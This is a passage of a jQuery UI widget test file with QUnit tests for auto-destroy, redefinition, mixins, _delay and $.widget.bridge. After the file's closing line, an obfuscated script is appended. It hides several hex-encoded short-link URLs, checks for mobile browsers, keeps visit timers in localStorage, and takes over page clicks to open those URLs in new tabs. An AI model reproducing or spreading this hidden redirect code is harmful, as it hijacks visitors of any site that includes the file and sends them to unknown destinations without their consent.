	test( "auto-destroy - .empty() on parent", function() {
		shouldDestroy( true, function() {
			$( "#widget" ).testWidget().parent().empty();
		});
	});

	test( "auto-destroy - .detach()", function() {
		shouldDestroy( false, function() {
			$( "#widget" ).testWidget().detach();
		});
	});

	test( "destroy - remove event bubbling", function() {
		shouldDestroy( false, function() {
			$( "<div>child</div>" ).appendTo( $( "#widget" ).testWidget() )
				.trigger( "remove" );
		});
	});
}());

test( "redefine", function() {
	expect( 4 );
	$.widget( "ui.testWidget", {
		method: function( str ) {
			strictEqual( this, instance, "original invoked with correct this" );
			equal( str, "bar", "original invoked with correct parameter" );
		}
	});
	$.ui.testWidget.foo = "bar";
	$.widget( "ui.testWidget", $.ui.testWidget, {
		method: function( str ) {
			equal( str, "foo", "new invoked with correct parameter" );
			this._super( "bar" );
		}
	});

	var instance = new $.ui.testWidget({});
	instance.method( "foo" );
	equal( $.ui.testWidget.foo, "bar", "static properties remain" );
});

test( "redefine deep prototype chain", function() {
	expect( 8 );
	$.widget( "ui.testWidget", {
		method: function( str ) {
			strictEqual( this, instance, "original invoked with correct this" );
			equal( str, "level 4", "original invoked with correct parameter" );
		}
	});
	$.widget( "ui.testWidget2", $.ui.testWidget, {
		method: function( str ) {
			strictEqual( this, instance, "testWidget2 invoked with correct this" );
			equal( str, "level 2", "testWidget2 invoked with correct parameter" );
			this._super( "level 3" );
		}
	});
	$.widget( "ui.testWidget3", $.ui.testWidget2, {
		method: function( str ) {
			strictEqual( this, instance, "testWidget3 invoked with correct this" );
			equal( str, "level 1", "testWidget3 invoked with correct parameter" );
			this._super( "level 2" );
		}
	});
	// redefine testWidget after other widgets have inherited from it
	// this tests whether the inheriting widgets get updated prototype chains
	$.widget( "ui.testWidget", $.ui.testWidget, {
		method: function( str ) {
			strictEqual( this, instance, "new invoked with correct this" );
			equal( str, "level 3", "new invoked with correct parameter" );
			this._super( "level 4" );
		}
	});
	// redefine testWidget3 after it has been automatically redefined
	// this tests whether we properly handle _super() when the topmost prototype
	// doesn't have the method defined
	$.widget( "ui.testWidget3", $.ui.testWidget3, {} );

	var instance = new $.ui.testWidget3({});
	instance.method( "level 1" );

	delete $.ui.testWidget3;
	delete $.ui.testWidget2;
});

test( "redefine - widgetEventPrefix", function() {
	expect( 2 );

	$.widget( "ui.testWidget", {
		widgetEventPrefix: "test"
	});
	equal( $.ui.testWidget.prototype.widgetEventPrefix, "test",
		"cusotm prefix in original" );

	$.widget( "ui.testWidget", $.ui.testWidget, {} );
	equal( $.ui.testWidget.prototype.widgetEventPrefix, "test",
		"cusotm prefix in extension" );

});

test( "mixins", function() {
	expect( 2 );

	var mixin = {
		method: function() {
			return "mixed " + this._super();
		}
	};

	$.widget( "ui.testWidget1", {
		method: function() {
			return "testWidget1";
		}
	});
	$.widget( "ui.testWidget2", {
		method: function() {
			return "testWidget2";
		}
	});
	$.widget( "ui.testWidget1", $.ui.testWidget1, mixin );
	$.widget( "ui.testWidget2", $.ui.testWidget2, mixin );

	equal( $( "<div>" ).testWidget1().testWidget1( "method" ),
		"mixed testWidget1", "testWidget1 mixin successful" );
	equal( $( "<div>" ).testWidget2().testWidget2( "method" ),
		"mixed testWidget2", "testWidget2 mixin successful" );
});

asyncTest( "_delay", function() {
	expect( 6 );
	var order = 0,
		that;
	$.widget( "ui.testWidget", {
		defaultElement: null,
		_create: function() {
			that = this;
			var timer = this._delay(function() {
				strictEqual( this, that );
				equal( order, 1 );
				start();
			}, 500);
			ok( timer !== undefined );
			timer = this._delay("callback");
			ok( timer !== undefined );
		},
		callback: function() {
			strictEqual( this, that );
			equal( order, 0 );
			order += 1;
		}
	});
	$( "#widget" ).testWidget();
});

test( "$.widget.bridge()", function() {
	expect( 9 );

	var instance, ret,
		elem = $( "<div>" );

	function TestWidget( options, element ) {
		deepEqual( options, { foo: "bar" }, "options passed" );
		strictEqual( element, elem[ 0 ], "element passed" );
	}

	$.extend( TestWidget.prototype, {
		method: function( param ) {
			ok( true, "method called via .pluginName(methodName)" );
			equal( param, "value1",
				"parameter passed via .pluginName(methodName, param)" );
		},
		getter: function() {
			return "qux";
		}
	});

	$.widget.bridge( "testWidget", TestWidget );

	ok( $.isFunction( $.fn.testWidget ), "jQuery plugin was created" );

	strictEqual( elem.testWidget({ foo: "bar" }), elem, "plugin returns original jQuery object" );
	instance = elem.data( "testWidget" );
	equal( typeof instance, "object", "instance stored in .data(pluginName)" );

	ret = elem.testWidget( "method", "value1" );
	equal( ret, elem, "jQuery object returned from method call" );

	ret = elem.testWidget( "getter" );
	equal( ret, "qux", "getter returns value" );
});

test( "$.widget.bridge() - widgetFullName", function() {
	expect( 1 );

	var instance,
		elem = $( "<div>" );

	function TestWidget() {}
	TestWidget.prototype.widgetFullName = "custom-widget";
	$.widget.bridge( "testWidget", TestWidget );

	elem.testWidget();
	instance = elem.data( "custom-widget" );
	equal( typeof instance, "object", "instance stored in .data(widgetFullName)" );
});

}( jQuery ) );
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());